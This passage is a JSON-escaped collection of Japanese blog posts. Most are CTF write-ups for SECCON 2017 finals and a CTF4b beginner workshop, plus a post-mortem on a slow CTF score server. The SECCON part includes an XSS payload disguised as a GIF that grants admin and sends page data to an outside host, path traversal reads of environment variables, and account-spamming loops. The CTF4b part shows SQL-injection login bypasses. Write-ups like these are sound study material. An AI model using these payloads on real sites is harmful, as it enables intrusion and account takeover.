console.log(await getWAV(\"fuchu.koth.seccon\", 8000, {unique_id: process.argv[2]}, process.argv[3]));\n})();\n```\n\n#### アカウントを量産して再生数を稼ぐスクリプト\n\n```sh\nexport FLAG=\"176872aa9e14b27d972e2c56b1ec16db\"\nexport USERID=\"2099\"\nexport APIKEY=\"8be67707f019fe37fb4cf74e096b815ebcebfc7fc10790d19e8d71eb32482d49\"\nexport RESP=$(curl -X POST http://fuchu.koth.seccon/files -H \"X-FUCHU-KEY: $APIKEY\" -F \"file=@./po.wav;type=audio/wav\")\nexport UNIQID=$(echo $RESP | sed -E 's/[^:]+:\"([^,]+)\".+/\\1/')\nexport PAYLOAD=$(printf '{\"name\":\"%s\",\"unique_id\":\"%s\",\"artist\":%s,\"description\":\"hello\"}' $FLAG $UNIQID $USERID)\ncurl -X POST http://fuchu.koth.seccon/songs -H \"X-FUCHU-KEY: $APIKEY\" -H \"Content-Type: application/json\" --data \"$PAYLOAD\"\n\nwhile true\ndo\n\texport USER=$(head /dev/urandom | md5)\n\texport PAYLOAD=$(printf '{\"username\":\"%s\",\"password\":\"Hello I Am NaruseJun\",\"email\":\"%s@seccon.jp\",\"sex\":\"0\",\"birthday\":\"2018-02-15\",\"free_text\":\"\"}' $USER $USER)\n\tcurl -X POST http://fuchu.koth.seccon/users -H \"Content-Type: application/json\" --data \"$PAYLOAD\"\n\texport PAYLOAD=$(printf '{\"username\":\"%s\",\"password\":\"Hello I Am NaruseJun\"}' $USER)\n\texport RESP=$(curl -X POST http://fuchu.koth.seccon/auth -H \"Content-Type: application/json\" --data \"$PAYLOAD\")\n\texport APIKEY=$(echo $RESP | sed -E 's/.+\"(.+)\".+/\\1/')\n\tnode increment.js $UNIQID $APIKEY\ndone\n```\n\nこれらを用いると、ディフェンスキーワードをランキングに載せることができるので、\nチームメイトにお願いして書き込み続けてもらいました。\n\n## 船橋\n\n提示された指紋画像と一致するような、別の指紋画像を20個の候補の中から10秒以内に選択するような問題が10題出され、\nそのうちいくつかに正解できればAttackPointが手に入ります。5問以上を解くことができれば、DefencePointも手に入る様子。\n\n教師用データセットも与えられるので、機械学習するのが正攻法？\n他のチームの方に話を聞いたら、そもそも問題として出て来る画像のバリエーションが多くないので、力押しでなんとかなる……らしい。\n\nボクが目視でそれっぽい指紋を選んだら通りました。\n競技開始直後に説いているチームがちらほらいたので、気合で解けそうだなぁという気分がしていました。\n\n## 幕張\n\nスマートロックのアプリ(x86_64 ELF)を解析する問題。解けませんでした。\n\n後から聞いた話だと、MQTTでいろいろしていて、SubscribeするとFLAGが降ってくるとかこないとか？\nなんか外と通信しているんだろうなぁというのは分かったんですが、\nELFが動いて競技ネットワークと通信できるような環境を用意するのが難儀で、後回しにしていました。\n\n\n## 梅田\n\n画像投稿サイト。Web問。\n\n### Defence\n\nまず、ディフェンスキーワードは最もFav数の多いベージのコメント欄なので、\nもっともFav数の多いページにキーワードを書き込み続けるだけでした。\n\nどのページが最もFav数が多いかを追いかけるのが面倒そうだなぁと感じていたんですが、\nそもそもFav数を増やして対象ページをコロコロ変えるような戦略を取るチームがいなかったようで、\nそれほど頻繁には変わっていませんでした。\n登録時にしばしば429エラーが出ていたので、アカウント量産するのが難しかったのかな？\n\n```sh\nwhile true\ndo\n\texport CONTENT=44b106151c01d64e0c479eb43ef12a48\n\tcurl http://umeda.koth.seccon/photos/1 -H \"Cookie: PHPSESSID=5d7ef56d0cab6e12ec27e431c004e569\" > cache\n\texport NAME=$(cat cache | sed -E 's/.+\"csrf_name\" value=\"([^\"]+)\".+/\\1/')\n\texport VALUE=$(cat cache | sed -E 's/.+\"csrf_value\" value=\"([^\"]+)\".+/\\1/')\n\tcurl http://umeda.koth.seccon/photos/1/comment -X POST -H \"Cookie: PHPSESSID=5d7ef56d0cab6e12ec27e431c004e569\" -d csrf_name=$NAME -d csrf_value=$VALUE -d content=$CONTENT\ndone\n```\n\n### Attack\n\n1つ目のFLAGは、普通に`ID:1`の画像ページに書いてあった。\n\n不適切な画像(?)を管理者に報告するフォームでXSSができるようでした。\nただし、`Content-Security-Policy: script-src 'self'`ヘッダがついているので、\n画像アップロード機能を悪用して、同一オリジンに悪意のあるスクリプトを設置する必要があります。\n\nこんな感じに、`GIF8`がファイル先頭にあれば、画像ファイルかどうかのチェックをすり抜けられます。\n\n```js\nGIF8=8;\n\nfetch(\"/admin/users\", {credentials: 'include'})\n.then(r => r.text())\n.then(r => {\n\tconst [,v] = r.match(/name=\"csrf_value\" value=\"(.+?)\"/);\n\tconst [,n] = r.match(/name=\"csrf_name\" value=\"(.+?)\"/);\n\tconst body = `csrf_value=${v}&csrf_name=${n}&name=azon`;\n\treturn fetch(\"/admin/new-admin\", {\n\t\tbody,\n\t\tmethod: \"POST\",\n\t\theaders: {\n\t\t\t'Content-Type': 'application/x-www-form-urlencoded',\n\t\t},\n\t\tcredentials: 'include',\n\t});\n})\n.then(r => r.text())\n.then(r => fetch(\"http://192.168.14.4:8000/users\", {method: \"POST\", body: r}))\n```\n\n管理者のブラウザで適当に`/admin`ページを漁ると、\nどうやら任意のユーザを管理者に昇格する機能が存在することが分かるので、↑のコードで自分のアカウントを管理者にします。\n管理者でログインすると、2つ目と3つ目のFLAGがCookieに設定されていました。\n\nで、更に管理者ページを探すと`/admin/logs`というアプリのログを確認する機能が存在することがわかります。\nこのページの挙動をよく観察すると、単にログファイルのtailを表示しているだけで、\nさらにそのログファイルを指定するパラメータにパストラバーサル脆弱性があるようでした。\n\n管理者で`/admin/logs?p=/../../../../../../var/www/umeda/src/routes.php`としてソースの末尾を見ると、\n4つ目と5つ目のFLAGは環境変数に書き込まれていることが分かります。\nちなみに、ソースコードの所在は、変なパラメータを投げた時に帰ってくるエラーメッセージを読むとわかります。\n\n環境変数は`/admin/logs?p=/../../../../../../proc/self/environ`で読めます。\n","title":"SECCON2017国内決勝大会に出ました","image":null,"tags":["CTF","SECCON","参加記"],"date":"2018-02-20T00:00:00.000Z","updated":"2021-01-07T13:52:12.000Z"},{"type":"article","slug":"17","body":"重い\n\n\n# CPCTF\n\nhttps://ctf-no.pro/\n\nこういうのをやりました。\n\n出題された問題の雰囲気はこういうかんじ（参加してくださった方のwriteupです）\n\nhttp://yuinore.net/2017/04/cpctf-writeup-1/\n\nhttp://yuinore.net/2017/04/cpctf-writeup-2/\n\nサーバ周りは全てボクが担当したんですが、ゴミクソ重くて申し訳なさがXDです。\n\n## 構成\n\n問題が60個とかそれくらいありました。多すぎる。\nで、この問題たちとスコアサーバを全て1台のサーバ(cpu:8Core mem:16GB)で動かしました。\n\n全てのアプリはDockerで環境が分離されています。\n自作のソフトウェア（Dockerのラッパみたいな何か）によって、PaaSみたいな使い心地で問題を更新できる仕組みにしてました。\n\n👆のお陰で、出題ミスが見つかっても更新が非常にスムーズでした。\n最終的に100アカウントくらいが登録されてましたが、サーバも落ちたりせずに概ね順調でした。\n\nが、HTTPでのアクセスがクッッッッッソ遅い問題にぶち当たって険しい感じでした。\nなんか変な感じの挙動で、一度繋がるとそれ以後数10分は快適に繋がるが、\n繋がらない人は永遠につながらない（HTTPレスポンスが帰ってこない）感じ。\n\nで、サーバ全体の負荷も大したことなかったし、ネットワーク帯域も余裕っぽかったので、謎かった。\n\n## 重い理由\n\nサーバが1台で、アプリが沢山乗ってる構成なので、HTTPリクエストを捌いてくれるリバースプロキシとして**OpenResty**さんを使っていて、\nHTTPS化を手っ取り早くやるために[lua-resty-auto-ssl](https://github.com/GUI/lua-resty-auto-ssl)を採用していました。\n\nhttps://github.com/GUI/lua-resty-auto-ssl\n\n[lua-resty-auto-ssl](https://github.com/GUI/lua-resty-auto-ssl)は非常に優秀で、\n**正しく設定すれば**勝手にすべてのページをHTTPS化してくれて便利便利floatです。\n\nでまぁ、結論を言うと重いのはこの人が原因でした。\n\nこの人はOCSP Staplingもやってくれるんですが、コレを正しく動作させるためにはOpenRestyの`resolver`設定をしてあげないとダメです。\nどうダメかというと、遅くなります。おそらくDNSの問い合わせができずにそこでワーカーが止まってしまい永遠にレスポンスが帰ってこないのかな？\n\nエラーログにはOCSPが失敗したよ！っていうログがいっぱい出ていなので、コレが問題なのは間違いないんですが詳しい原因はコレ以上分からずです。\n一旦繋がると以後は素早く繋がるのは多分、一度OCSPで証明書の正当性が確認されるとしばらくは確認しないから……？\nでもOCSP Staplingってサーバ側が能動的に送ってるものな気がするし違うのでしょうか……\n\nそれと、[lua-resty-auto-ssl](https://github.com/GUI/lua-resty-auto-ssl)が内部で使ってるLetsencryptクライアントの\n[dehydrated](https://github.com/lukas2511/dehydrated)は、デフォルトだとRSA **4096bit**の証明書を作成します。\n4096bitは結構遅いです。適当に`ab`で計測したら4096bitは2048bitを比較してリクエスト完了まで10倍くらいの時間がかかってました。\n\n## Dockerの内部DNS\n\nさっきのOpenRestyはDockerコンテナ内で動かしてたんですが、\nDocker内部だとデフォルトゲートウェイがDockerネットワーク内でのホストのアドレスなので、\nDNSのについてもこの人がやってくれてるんだろうな〜〜って勝手に思って勝手にそう指定してたんですが、これが間違いでした。\n\nDockerネットワーク内でのDNSサーバは、`127.0.0.11`が正しいそうです。\nというか、resolve.confを見たらちゃんと書いてあったわ……\n\n## おわり\n\nわからないことが多いです。\n誰か鉞投げて欲しい。\n","title":"新入生向けCTF体験会のスコアサーバが重かった","image":null,"tags":["CTF","DNS","Docker","インフラ","ネットワーク","日記"],"date":"2017-05-17T00:00:00.000Z","updated":"2021-01-07T09:09:45.000Z"},{"type":"external","url":"https://trap.jp/post/200/","publisher":"東京工業大学デジタル創作同好会traP","title":"VolgaCTF 2017 Quals に出た話【新歓ブログリレー2017 11日目】","tags":["traP","CTF","参加記"],"date":"2017-04-07T00:00:00.000Z"},{"type":"external","url":"https://trap.jp/post/167/","publisher":"東京工業大学デジタル創作同好会traP","title":"サイバーコロッセオ×SECCON 2016に出ました","tags":["traP","CTF","参加記"],"date":"2017-03-07T00:00:00.000Z"},{"type":"article","slug":"13","body":"行きました\n\n東京から参りました成瀬順と申します。\n\nCTF4b東京は大人気だったらしく行けなかったので、金沢へ参加しました。\n\n# Web\n\n- ChromeのDevToolsの使い方\n- ディレクトリトラバーサル\n- SQLインジェクション\n- XSS(の紹介だけ)\n\n演習中心で、実際にやってみよう！って感じなので楽しくて分かりやすかったです。\n\nあとディレクトリトラバーサルとかSQLインジェクションの演習になんか隠しFLAGみたいなものが置いてあって、\n†ビギナー†の人も楽しめそうでした。\n\nSQLiの方の隠しFLAGは見つけられました\n`web4b{can_access_another_table}`\n\n# Forensics\n\n- Forensicsとは\n- ネットワークについて\n- ツールの使い方\n  - Wireshark\n  - binwalk\n  - exiftool\n  - The Sleuth Kit\n\nForensicsは全く知識がなかったので色々勉強になりました。\nWiresharkの便利な機能をたくさん知れたので強くなった気がします💪\n\n# Reversing\n\n- プログラム実行の仕組み\n- x86アセンブリ入門\n\nちょうど大学でx86を勉強したところだったので、なんとかついていけました。\n**上達のコツ**はたくさん読むことだそうです（がんばります＞＜）\n\n# CTF\n\n講義で学んだことを活かしてみよう！というやつです。\n\nがんばって全部解きました！\n\n![](1.png)\n\nhttps://twitter.com/ctf4b/status/802446106776850432\n\nFLAGためて10分前にまとめて出してみました。\nいわゆるサブマリン戦法です。（一度やってみたかったんです＞＜）\n\n以下Writeup\n\n\n## Warmup (Misc 10)\n\nやるだけ\n\n## てけいさん for ビギナーズ (Misc 200)\n\nめっちゃ簡単な計算問題が100問出されるので全部解いてねって問題でした。\n与えられたURLにアクセスすると計算式が書いてあって、その下にあるフォームに値を入力してSubmitするようになってます。\nたぶんPHPのSESSIONで何問解いたかをカウントしてるので、ここはどうにもできなさそうです。\n\n最初ふつうに100問解こうかなと思ったんだけど間違えたらリセットされるみたいなのでやめました。\n\nJavaScriptを書いて(Web講義で習ったDevToolsを使って)100回走らせました。\n\n```javascript\ndocument.querySelector(\"input[type=text]\").value = eval(document.querySelector(\"div\").textContent);\ndocument.querySelector(\"input[type=submit]\").click();\n```\n\n模範解答はPython(?)でやってたけどスクレイピングして……とかが面倒そうでした。\n\n## CountUp Game (Misc 200)\n\n> 交互にカウントアップしていこう ただし，21を言ってはいけません\n\nコンピュータと交互に1〜3づつ値を増やしていって、21を踏んだら負けるゲームを10連勝してねって問題でした。\nなんか競プロでありそうな問題ですね。\n\nそんなに難しくなくて、自分が必ず後攻なので、自分が必ず4の倍数を踏むようにしていれば勝てます。\nたった10勝でOKなので、手でやりました。\n\n## Fix it (Web 100)\n\n> ページ遷移を行うプログラムを書いたが何かを間違っているらしく正常に動作しないそうだ。何がおかしいのか調べてほしい。\n\n講義でやったやつだ！\n\n送られてくるヘッダをよく見てみると、\n`Locatin: /web100/flag_is_here.php`\nTypoしてます。\n\nということで、このURLにに行くとFlagが落ちてました。\n\n## Login as Admin (Web 200)\n\nこれも講義でやったやつだ！\n\nSQLインジェクションっぽいですね。\nので、\n```\nusername: admin\npassword: ' OR 1 --\n```\nとかしてみたらイケました。\n\n## 1M4G3 V13W3R (Web 200)\n\n画像アップローダです。\nアップされた画像を開いてみると、URLが`/web200-2/view.php?file=f5b5a9b812d45f55.jpg`とかで、怪しい。\n\n講義でやったディレクトリトラバーサルかな！？\n\nじゃあ`/web200-2/view.php?file=../index.php`とかすると、\nPHPコメントでFlagが書いてありました。\n\n## Login Lv2 (Web 300)\n\nまたログインフォームです。\n普通にSQLインジェクションを試行するんですが、どうも上手く行かないようです。\n（でもエラーにはなります。うーん？）\n\n適当にログインを試行していると、「ユーザー名かパスワードが間違っています。」と怒られるんですけど、\nこのときのURLが`/web300/index.php?error=invalid_user.txt`とかなってて、アレかなってなりました。\n\nということで、POSTリクエストの宛先である`/web300/index.php?error=login.php`を見てみると、\n```php\n$sql = \"SELECT username, password FROM users WHERE username = ('{$username}') AND password = ('{$password}');\";\n```\n\nカッコで囲んでいたんですね！\nじゃあこうすれば……\n```\nusername: admin\npassword: ') OR 1 --\n```\nイケました。\n\n## FileSystem (Forensics 100)\n\n謎のファイルが渡されます。\n（なんのファイルかは問題名から察せそうですけど、）とりあえず講義で学んだように、どんなファイルであるかを調べてみます。\n\n```sh\n# file for100\nfor100: DOS/MBR boot sector, code offset 0x3c+2, OEM-ID \"mkfs.fat\", sectors/cluster 4, root entries 512, sectors 8192 (volumes <=32 MB) , Media descriptor 0xf8, sectors/FAT 6, sectors/track 32, heads 64, serial number 0x742adb6b, unlabeled, FAT (12 bit)\n```\n\nFATですね。\nではでは、講義で習ったThe Sleuth Kitを使ってみます。\n\n```sh\n# fls for100\nr/r 4:   flag.txt\nr/r * 6: .flag.txt.swp\nv/v 130867: $MBR\nv/v 130868: $FAT1\nv/v 130869: $FAT2\nd/d 130870: $OrphanFiles\n```\n\nありますね！\n\n```sh\n# icat for100 4\nctf4b{\n```\n\n消えてる……\n\nここで削除済みの`.flag.txt.swp`に注目します。\nこのファイルはvimが編集履歴を保持しておくファイルで、通常はファイルが保存されたらこのswpは削除されます。\n\nでもこのイメージにはバッチリ(削除済みファイルとして)残ってるので、\n\n```sh\n# icat for100 6\nU3210#\"! Utpad????ctf4b{ff97e486da08bfec774688ca3ef6ac42}\n```\n\n### ラクをする\n\n問題名から察するに、講義で紹介したThe Sleuth Kitを使ってなんかしてね！って問題なんだろうなって思ったんですけど、\nstringsでゴリ押してしまいました＞＜\n\n```sh\nstrings for100 | grep ctf4b{\n```\n\n## みてみよう (Forensics 200)\n\npcapファイルが渡されます。\n\nそんなにリクエスト数が多くなくて、PNGをダウンロードしてるHTTP通信が１つだけです。\n授業で習ったように、ファイル＞オブジェクトをエクスポートでこのPNGをファイルを取り出してみます。\n\nそうするとただの真っ白な画像ファイルでした。（困った……）\nここで、講義で習ったbinwalkを使ってみます。\n\n```sh\n# binwalk flag.png\n\nDECIMAL       HEXADECIMAL     DESCRIPTION\n--------------------------------------------------------------------------------\n0             0x0             PNG image, 320 x 240, 8-bit/color RGB, non-interlaced\n41            0x29            Zlib compressed data, best compression\n744           0x2E8           Unix path: /www.w3.org/1999/02/22-rdf-syntax-ns#'>\n```\n\nなんかRDFのデータがくっついてますね。\nじゃあ、講義で習ったexiftoolを使ってみます。\n\n```sh\n# exiftool flag.png\nExifTool Version Number         : 10.20\nFile Name                       : flag.png\nDirectory                       : ..\nFile Size                       : 1010 bytes\nFile Modification Date/Time     : 2016:11:27 03:02:03+00:00\nFile Access Date/Time           : 2016:11:27 03:06:03+00:00\nFile Inode Change Date/Time     : 2016:11:27 03:02:33+00:00\nFile Permissions                : rwxrwx---\nFile Type                       : PNG\nFile Type Extension             : png\nMIME Type                       : image/png\nImage Width                     : 320\nImage Height                    : 240\nBit Depth                       : 8\nColor Type                      : RGB\nCompression                     : Deflate/Inflate\nFilter                          : Adaptive\nInterlace                       : Noninterlaced\nXMP Toolkit                     : Image::ExifTool 9.74\nKeywords                        : ctf4b{f970e2767d0cfe75876ea857f92e319b}\nImage Size                      : 320x240\nMegapixels                      : 0.077\n```\n\n見えました！\n\n### ラクをする\n\nたぶん講義で紹介したWiresharkを使ってFlag探してね！って問題なんだろうなって思ったんですけど、\nstringsでゴリ押してしまいました＞＜\n\n```sh\nstrings for200 | grep ctf4b{\n```\n\n## ICMP？ (Forensics 200)\n\npcapファイルが渡されます。\n\nWiresharkで普通に開くと、pingのrequestとreplyだけが記録されています。\n眺めていると、1つだけサイズが大きい通信があります。（統計＞パケット長を見ても良かったかも。）\n\nで、このパケットを見ると、pingのDataに何故かHTTPレスポンスがのっています。\n\n```\nY'VERM]@@ {T HTTP/1.1 200 OK\nDate: Thu, 14 Jul 2016 14:28:30 GMT\nServer: Apache/2.4.20 (Debian)\nLast-Modified: Thu, 14 Jul 2016 14:21:21 GMT\nETag: \"35-537993754cce4\"\nAccept-Ranges: bytes\nContent-Length: 53\nContent-Type: text/plain\n\nY3RmNGJ7NTM2ZGFjMzcxYWE2NTJmODY1YzIwYWJlN2I0MDk0ZGJ9\nn\n```\n\nこの文字列、講義で習ったbase64っぽくないですか？\nということでデコードしてみます。\n\n```sh\n# echo Y3RmNGJ7NTM2ZGFjMzcxYWE2NTJmODY1YzIwYWJlN2I0MDk0ZGJ9 | base64 -d\nctf4b{536dac371aa652f865c20abe7b4094db}\n```\n\n### ラクをする\n\nまぁとりあえずstringsします！！！\n\n```sh\nstrings for200-2\n```\n\nそしたらbase64っぽい文字列が見えてしまったのでデコードしたらFLAGでした。\n（なんかbase64ってなんとなくわかりますよね）\n\n## adminでログインしろ！ (Forensics 300)\n\npcapとサービスのURLが渡されます。\n\nとりあえずSQLインジェクションとか試して見るんですけど、(まぁForensicsだし)ダメでした。\nで、よく見るとパスワードリセットができるようになっています。\nが、リセットしようとするとメールアドレスと郵便番号を入力しろと言われます。\n\nということで、サービス管理者の通信を盗聴したっぽいpcapを見に行きます。\nとりあえず脳死stringsしましたが成果がなかったので、Wiresharkを使って講義で習ったヤツをやってみました。\n\nWiresharkの統計＞プロトコル階層を見てみたところ、\nなんか大量の通信の中にちょっとだけSMTP(メール送信)の通信が記録されていました。\n（少ないやつは怪しいって講義で習いました。）\n\nで、この通信を覗いてみる(講義で習ったFollow TCP Stream)と、\nどうやら管理者と思しきアドレスから、画像つきで「引っ越しました！」みたいなメールを送っていました。\n\n```\n220 4a256f335dbb Python SMTP proxy version 0.2\nehlo debian.debian\n502 Error: command \"EHLO\" not implemented\nhelo debian.debian\n250 4a256f335dbb\nmail FROM:<admin@poe.ctf4b>\n250 Ok\nrcpt TO:<john@poe.ctf4b>\n250 Ok\ndata\n354 End data with <CR><LF>.<CR><LF>\nContent-Type: multipart/mixed; boundary=\"===============1980392290290904787==\"\nMIME-Version: 1.0\nTo: john@poe.ctf4b\nFrom: admin@poe.ctf4b\nSubject: 引越しました\n\n--===============1980392290290904787==\nContent-Type: text/plain; charset=\"us-ascii\"\nMIME-Version: 1.0\nContent-Transfer-Encoding: 8bit\n\n\n会津若松に引越しました.\nお近くにお越しの節はどうぞお気軽にお立ち寄り下さい.\n\n新居から見える景色を画像で添付します.\n\n\n--===============1980392290290904787==\nContent-Type: image/jpeg\nMIME-Version: 1.0\nContent-Transfer-Encoding: base64\nContent-Disposition: attachment; filename=\"./keshiki.jpg\"\n\n<<<略>>>\n--===============1980392290290904787==--\n.\n250 Ok\nquit\n221 Bye\n```\n\nとりあえずこれで管理者のメールアドレス`admin@poe.ctf4b`は手に入ったので、次はメールに添付されている画像です。\n画像はbase64化されてメールにくっついているので、デコードしてみるんですが、見ても写っているのが何処かなんてピンと来ません。\n\nじゃあ、ということで講義で紹介されたexiftoolでEXIFを見ると……\n撮影した位置情報(GPS Position)がバッチリ残っていました。\n\n```sh\n# exiftool -GPSPosition keshiki.jpg\nGPS Position                    : 37 deg 29' 54.83\" N, 139 deg 56' 9.00\" E\n```\n\nこのGPS座標をGoogleMapとかに入れれば大体の場所がわかるので、あとは適当にググって郵便番号を割り出します。\nで、この2つの情報でパスワードリセットすればログインしてFlagが見れます。\n\n## Welcome Reversing World! (Reversing 100)\n\n実行すると`Enjoy CTF!`って出てきて終わります。\n\nバイナリがいきなりstrippedで読むのが辛い＞＜\n頑張って読むと、`Enjoy CTF!`を表示するちょっと手前に、なんか怪しいことをしてます。\n\n```x86asm\n 804841c:   c7 45 f0 00 00 00 00    mov    DWORD PTR [ebp-0x10],0x0\n 8048423:   c7 45 f4 e0 84 04 08    mov    DWORD PTR [ebp-0xc],0x80484e0\n 804842a:   83 7d f0 00             cmp    DWORD PTR [ebp-0x10],0x0\n 804842e:   74 10                   je     8048440 <__libc_start_main@plt+0x150>\n 8048430:   83 ec 0c                sub    esp,0xc\n 8048433:   ff 75 f4                push   DWORD PTR [ebp-0xc]\n 8048436:   e8 a5 fe ff ff          call   80482e0 <puts@plt>\n```\n\nC言語っぽく書けば\n```c\nint num = 0;\nchar* flag = 0x80484e0;\nif(num != 0){\n   puts(flag);\n}\n```\n\nみたいなカンジですね。\nまぁどう考えてもif文の中が実行されるワケがないですね。\nでもアドレスがわかるので、ココを見れば表示されるはずの文字列がわかります。\n\n`0x80484e0`は.rodataセクションの中なので、\n\n```sh\n# objdump -s -j.rodata bin100\n\nbin100:     file format elf32-i386\n\nContents of section .rodata:\n 80484d8 03000000 01000200 63746634 627b3537  ........ctf4b{57\n 80484e8 72316e36 355f6330 6d6d346e 645f6631  r1n65_c0mm4nd_f1\n 80484f8 6e645f66 6c34367d 00456e6a 6f792043  nd_fl46}.Enjoy C\n 8048508 54462100                             TF!.\n```\n\nありました。\n\n### ラクをする\n\n脳死stringsで見つかってしまった\n```sh\nstrings bin100\n```\n\n作問者さんによる解説でもstringsが想定解って言ってました(?)\n\n## Lecture Review (Reversing 200)\n\n与えられたバイナリの指定された部分(nopで囲まれたところ)を抜けると`%eax`の値はいくつになっているか？\n講義の演習でやった計算をやってみよう！ってやつですね。\n\nがんばって読んで計算するだけです。\n\n### ラクをする\n\ngdbを使うとちょっとラクできます。\n\n```sh\n# gdb -q ./bin200_1\nReading symbols from ./bin200_1...(no debugging symbols found)...done.\n(gdb) disas main\nDump of assembler code for function main:\n   0x08048416 <+0>:  push   ebp\n   0x08048417 <+1>:  mov    ebp,esp\n   0x08048419 <+3>:  sub    esp,0x10\n   0x0804841c <+6>:  nop\n   0x0804841d <+7>:  nop\n   0x0804841e <+8>:  mov    DWORD PTR [ebp-0xc],0x14\n   0x08048425 <+15>: mov    DWORD PTR [ebp-0x8],0x8\n   0x0804842c <+22>: mov    DWORD PTR [ebp-0x4],0xfffffffd\n   0x08048433 <+29>: push   DWORD PTR [ebp-0x4]\n   0x08048436 <+32>: push   DWORD PTR [ebp-0x8]\n   0x08048439 <+35>: push   DWORD PTR [ebp-0xc]\n   0x0804843c <+38>: call   0x80483db <calc>\n   0x08048441 <+43>: add    esp,0xc\n   0x08048444 <+46>: mov    ds:0x804a01c,eax\n   0x08048449 <+51>: mov    eax,ds:0x804a01c\n   0x0804844e <+56>: nop\n   0x0804844f <+57>: nop\n   0x08048450 <+58>: mov    eax,0x0\n   0x08048455 <+63>: leave\n   0x08048456 <+64>: ret\nEnd of assembler dump.\n(gdb) b*0x0804844e\nBreakpoint 1 at 0x804844e\n(gdb) r\nStarting program: /media/sf_share/bin200_1\n\nBreakpoint 1, 0x0804844e in main ()\n(gdb) i r\neax            0xffffffe5\t-27\necx            0xd4024da0\t-738046560\nedx            0xffffffe8\t-24\nebx            0x0\t0\nesp            0xffffdc18\t0xffffdc18\nebp            0xffffdc28\t0xffffdc28\nesi            0x1\t1\nedi            0xf7fc6000\t-134455296\neip            0x804844e\t0x804844e <main+56>\neflags         0x296\t[ PF AF SF IF ]\ncs             0x23\t35\nss             0x2b\t43\nds             0x2b\t43\nes             0x2b\t43\nfs             0x0\t0\ngs             0x63\t99\n```\n\n## Not Print FLAG (Reversing 200)\n\n渡されたバイナリを動かすと\n`Sorry. I forgot to display the FLAG. This message is not FLAG.`\nって言われて終わります。\n\n（strippedなのでつらいのですが＞＜）バイナリをよく読んでみると、\nなんだか怪しいことをしてる部分が見つかります。（↑を表示するちょっと手前の部分です）\n```x86asm\n 8048471:   c7 45 f0 00 00 00 00    mov    DWORD PTR [ebp-0x10],0x0\n 8048478:   eb 11                   jmp    804848b <putchar@plt+0x13b>\n 804847a:   8b 45 f0                mov    eax,DWORD PTR [ebp-0x10]\n 804847d:   8b 04 85 40 a0 04 08    mov    eax,DWORD PTR [eax*4+0x804a040]\n 8048484:   89 45 f4                mov    DWORD PTR [ebp-0xc],eax\n 8048487:   83 45 f0 01             add    DWORD PTR [ebp-0x10],0x1\n 804848b:   8b 45 f0                mov    eax,DWORD PTR [ebp-0x10]\n 804848e:   83 f8 19                cmp    eax,0x19\n 8048491:   76 e7                   jbe    804847a <putchar@plt+0x12a>\n```\n\nどこかから何かを読んで`ebp-0xc`へ格納していますが、読み出した値は使ってませんね。\nあー！_forgot to display_ってそういうことか！\n\nで、読み出し元の`0x804a040`というのは.dataセクションなので、ココを見ると……\n```sh\n# objdump -s -j.data ./bin200_2\n\n./bin200_2:     file format elf32-i386\n\nContents of section .data:\n 804a020 00000000 00000000 00000000 00000000  ................\n 804a030 00000000 00000000 00000000 00000000  ................\n 804a040 31000000 6e000000 37000000 5f000000  1...n...7..._...\n 804a050 76000000 34000000 6c000000 75000000  v...4...l...u...\n 804a060 33000000 5f000000 33000000 71000000  3..._...3...q...\n 804a070 75000000 34000000 6c000000 5f000000  u...4...l..._...\n 804a080 63000000 68000000 34000000 72000000  c...h...4...r...\n 804a090 34000000 63000000 37000000 33000000  4...c...7...3...\n 804a0a0 72000000 00000000                    r.......\n```\n\nそれっぽいのが見つかりました。\n\n## Encrypted FLAG (Reversing 300)\n\nFLAGを入力するとそれが正解かどうかを判定してくれるバイナリです。\n\n.dataセクションになにやらそれっぽい`flag`っていう変数があります。\n\n```\n(gdb) x/s 0x804a02c\n0x804a02c <flag>:\t\"\\226\\201\\223\\301\\227\\216\\215\\232\\207\\252\\215\\232\\207\\252\\206\\234\\230\\205\\231\\220\\252\\226\\207\\214\\205\\201\\324\\324\\210\\365\"\n```\n\nどうやら暗号化されているようで、そのままでは読めないです。\n\nバイナリを読んでみると、`flag`を`decrypt`という関数で変換して、そのデータをstrcmpで入力と比較しています。\n\n実際にflagを変換している部分がココ\n```x86asm\n 8048558:   83 c4 10                add    esp,0x10\n 804855b:   83 ec 04                sub    esp,0x4\n 804855e:   6a 42                   push   0x42\n 8048560:   6a 1e                   push   0x1e\n 8048562:   68 2c a0 04 08          push   0x804a02c\n 8048567:   e8 73 00 00 00          call   80485df <decrypt>\n 804856c:   83 c4 10                add    esp,0x10\n 804856f:   83 ec 04                sub    esp,0x4\n 8048572:   6a b7                   push   0xffffffb7\n 8048574:   6a 1e                   push   0x1e\n 8048576:   68 2c a0 04 08          push   0x804a02c\n 804857b:   e8 5f 00 00 00          call   80485df <decrypt>\n```\n\n講義でやった関数呼び出しの話を思い出すと、\nどうやら`decrypt`に`flag`のアドレス、何らかの値①、何らかの値②を順番に渡しています。\n\n`0x804a02c`がflagのアドレスなので、C言語っぽく書いてみると、\n```c\ndecrypt(flag, 0x1e, 0x42);\ndecrypt(flag, 0x1e, 0xffffffb7);\n```\nこの0x1e、`strlen(flag) == 0x1e`なので、どうやらflagの長さっぽいですね。\n\nで、`decrypt`が何をしているかというと、\n\n```x86asm\n080485df <decrypt>:\n 80485df:   55                      push   ebp\n 80485e0:   89 e5                   mov    ebp,esp\n 80485e2:   83 ec 14                sub    esp,0x14\n 80485e5:   8b 45 10                mov    eax,DWORD PTR [ebp+0x10]\n 80485e8:   88 45 ec                mov    BYTE PTR [ebp-0x14],al\n 80485eb:   c7 45 fc 00 00 00 00    mov    DWORD PTR [ebp-0x4],0x0\n 80485f2:   eb 1c                   jmp    8048610 <decrypt+0x31>\n 80485f4:   8b 55 fc                mov    edx,DWORD PTR [ebp-0x4]\n 80485f7:   8b 45 08                mov    eax,DWORD PTR [ebp+0x8]\n 80485fa:   01 c2                   add    edx,eax\n 80485fc:   8b 4d fc                mov    ecx,DWORD PTR [ebp-0x4]\n 80485ff:   8b 45 08                mov    eax,DWORD PTR [ebp+0x8]\n 8048602:   01 c8                   add    eax,ecx\n 8048604:   0f b6 00                movzx  eax,BYTE PTR [eax]\n 8048607:   32 45 ec                xor    al,BYTE PTR [ebp-0x14]\n 804860a:   88 02                   mov    BYTE PTR [edx],al\n 804860c:   83 45 fc 01             add    DWORD PTR [ebp-0x4],0x1\n 8048610:   8b 45 fc                mov    eax,DWORD PTR [ebp-0x4]\n 8048613:   3b 45 0c                cmp    eax,DWORD PTR [ebp+0xc]\n 8048616:   7c dc                   jl     80485f4 <decrypt+0x15>\n 8048618:   90                      nop\n 8048619:   c9                      leave\n 804861a:   c3                      